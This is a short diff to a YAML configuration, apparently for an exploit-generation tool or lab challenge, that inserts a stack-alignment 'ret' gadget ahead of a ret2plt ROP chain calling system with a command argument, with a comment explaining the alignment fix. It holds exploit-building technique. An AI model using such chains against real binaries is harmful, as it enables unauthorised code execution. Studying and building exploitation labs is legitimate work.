@@ -37,6 +37,10 @@ priors: [10, 1]
 
 build:
   technique: ret2plt_eval2
+  # the ret_align leads: the compiler's real frame leaves the return
+  # into system one qword off the ABI alignment (the source comment
+  # describes the intent, the binary answers) - the bare ret re-stacks
+  # the entry rsp before the pop_rdi chain
   layout:
     - [padding, measured_offset]
-    - [chain, "gadget:pop_rdi_ret", "sym:arg_cmd", "plt_addr:system"]
+    - [chain, "gadget:ret_align", "gadget:pop_rdi_ret", "sym:arg_cmd", "plt_addr:system"]
